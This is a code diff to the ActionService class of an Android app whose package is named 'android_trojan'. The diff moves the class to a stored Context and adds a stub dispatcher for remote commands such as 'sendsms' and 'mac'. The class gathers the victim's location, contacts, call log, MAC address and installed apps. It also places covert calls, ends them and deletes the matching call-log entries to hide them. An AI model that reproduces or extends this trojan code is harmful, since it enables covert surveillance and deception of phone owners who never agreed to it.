@@ -20,6 +20,8 @@ import android.util.Log;
 import java.util.ArrayList;
 import java.util.List;
 
+import org.json.*;
+
 import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;
 
 /**
@@ -28,10 +30,36 @@ import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;
 public class ActionService {
 
     private static final String TAG = "ActionService";
+    private Context context;
 
-    public double[] getLocation(Context context) {
+    public ActionService(Context context){
+        this.context = context;
+    }
+
+    public String action(String arg) {
+        JSONObject argjson;
+        try {
+            argjson = new JSONObject(arg);
+            JSONArray array = argjson.getJSONArray("sendsms");
+            Log.d(TAG, String.valueOf(array.get(1).toString()));
+        }catch (JSONException ex){
+            Log.d(TAG, ex.getMessage());
+        }
+
+
+
+        return "null";
+        /*
+        switch (argjson){
+            case "mac": return getMacAddress();
+            case "sendsms": return SendSMS();
+            default: return null;
+        }*/
+    }
+
+    public double[] getLocation() {
         //Get location manager
-        LocationManager locManager = (LocationManager) context.getSystemService(context.LOCATION_SERVICE);
+        LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);
         //get the best provider to obtain the current location
         Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
         double[] result = new double[2];
@@ -49,8 +77,8 @@ public class ActionService {
     }
 
 
-    public ArrayList getContacts(Context context) {
-        ContentResolver cr = context.getContentResolver();
+    public ArrayList getContacts() {
+        ContentResolver cr = this.context.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
         ArrayList<String[]> contacts = new ArrayList<String[]>();
@@ -77,23 +105,23 @@ public class ActionService {
         return contacts;
     }
 
-    public void call(String num, long time, Context context) {
+    public void call(String num, long time) {
         if (time > 1000) {
             Intent intent = new Intent(Intent.ACTION_CALL);
             intent.setData(Uri.parse("tel:" + num));
-            context.startActivity(intent);
+            this.context.startActivity(intent);
             Log.d(TAG, "Start call");
             PhoneStateReceiver test = new PhoneStateReceiver();
             Tools.sleep(time);
-            test.onReceive(context, intent);
-            test.killCall(context);
+            test.onReceive(this.context, intent);
+            test.killCall(this.context);
             Log.d(TAG, "Stop call");
             Tools.sleep(1000);
-            deleteCallLog(num, context);
+            deleteCallLog(num);
         }
     }
 
-    public ArrayList getCallLog(Context context) {
+    public ArrayList getCallLog() {
         ArrayList<String[]> callLog = new ArrayList<String[]>();
         String columns[] = new String[]{
                 CallLog.Calls._ID,
@@ -101,7 +129,7 @@ public class ActionService {
                 CallLog.Calls.DATE,
                 CallLog.Calls.DURATION,
                 CallLog.Calls.TYPE};
-        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
+        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
         if (cursor.moveToFirst()) {
             do {
                 callLog.add(new String[]{
@@ -116,13 +144,13 @@ public class ActionService {
         return callLog;
     }
 
-    public void deleteCallLog(String num, Context context) {
+    public void deleteCallLog(String num) {
         String strNumberOne[] = {num};
-        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
+        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
         if (cursor.moveToFirst()) {
             do {
                 int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
-                context.getContentResolver().delete(
+                this.context.getContentResolver().delete(
                         CallLog.Calls.CONTENT_URI,
                         CallLog.Calls._ID + "= ? ",
                         new String[]{String.valueOf(idOfRowToDelete)});
@@ -130,8 +158,8 @@ public class ActionService {
         }
     }
 
-    public String getMacAddress(Context context) {
-        WifiManager manager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
+    public String getMacAddress() {
+        WifiManager manager = (WifiManager) this.context.getSystemService(Context.WIFI_SERVICE);
         WifiInfo info = manager.getConnectionInfo();
         return info.getMacAddress();
     }
@@ -156,8 +184,8 @@ public class ActionService {
         }
     }
 
-    public ArrayList<PInfo> getPackages(Context context) {
-        ArrayList<PInfo> apps = getInstalledApps(false, context); /* false = no system packages */
+    public ArrayList<PInfo> getPackages() {
+        ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
         final int max = apps.size();
         for (int i = 0; i < max; i++) {
             apps.get(i).prettyPrint();
@@ -165,20 +193,20 @@ public class ActionService {
         return apps;
     }
 
-    public ArrayList<PInfo> getInstalledApps(boolean getSysPackages, Context context) {
+    public ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
         ArrayList<PInfo> res = new ArrayList<PInfo>();
-        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
+        List<PackageInfo> packs = this.context.getPackageManager().getInstalledPackages(0);
         for (int i = 0; i < packs.size(); i++) {
             PackageInfo p = packs.get(i);
             if ((!getSysPackages) && (p.versionName == null)) {
                 continue;
             }
             PInfo newInfo = new PInfo();
-            newInfo.appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
+            newInfo.appname = p.applicationInfo.loadLabel(this.context.getPackageManager()).toString();
             newInfo.pname = p.packageName;
             newInfo.versionName = p.versionName;
             newInfo.versionCode = p.versionCode;
-            newInfo.icon = p.applicationInfo.loadIcon(context.getPackageManager());
+            newInfo.icon = p.applicationInfo.loadIcon(this.context.getPackageManager());
             res.add(newInfo);
         }
         return res;
